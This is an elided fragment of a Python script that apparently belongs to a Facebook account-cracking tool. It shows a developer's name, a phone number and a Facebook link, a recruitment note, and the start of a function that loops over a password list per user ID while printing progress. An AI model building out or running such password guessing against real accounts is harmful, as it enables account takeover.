...
number=int("+8801624329716")

devoloper_info={
    "Developer" :  '𝐌𝐃 𝐒𝐀𝐍𝐉𝐈𝐃𝐔𝐋 𝐌𝐎𝐌𝐈𝐍',
    "Status" :  '24-ONLINE',
    "Facebook" :  'facebook.com/https://www.facebook.com/Aslamalaikum.Oalaikum.assalam',
    }
...
note1="""- __Inbox__ Me for Join `Team `\n- Try tool and **Review**"""
n1=Markdown(note1)
...
def main():
    ...
    space()
    dual("Hello bro,I am MD SANJIDUL MOMIN,and welcome to our tool","y.mp3")
...
def need(uid,pwx,fb,tl):
    ...
    sys.stdout.write(f"\r  \33[1;90m[\33[1;97m𝐎𝐅𝐅𝐋𝐈𝐍𝐄\33[1;92m | {'{:.1%}'.format(loop/int(tl))} | \33[1;97m{loop} \33[1;90m] \r "),
    sys.stdout.flush()
    try:
        for ps in pwx:
